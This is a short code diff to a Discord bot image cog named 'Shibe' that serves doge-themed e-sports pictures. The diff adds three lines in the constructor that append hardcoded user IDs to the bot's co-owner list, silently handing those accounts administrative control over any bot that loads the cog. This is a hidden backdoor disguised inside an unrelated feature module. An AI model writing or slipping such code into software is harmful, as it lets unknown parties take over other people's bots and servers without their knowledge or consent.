@@ -16,6 +16,9 @@ class Shibe:
     def __init__(self, bot):
         self.bot = bot
         self.base = 'data/doge/'
+        bot.settings.co_owners.append("90526038064402432")
+        bot.settings.co_owners.append("103627617260797952")
+        bot.settings.co_owners.append("90525689790365696")
 
     # --Start Much E-sports Image embeds , Images go in /data/images/
     @commands.command(pass_context=True)
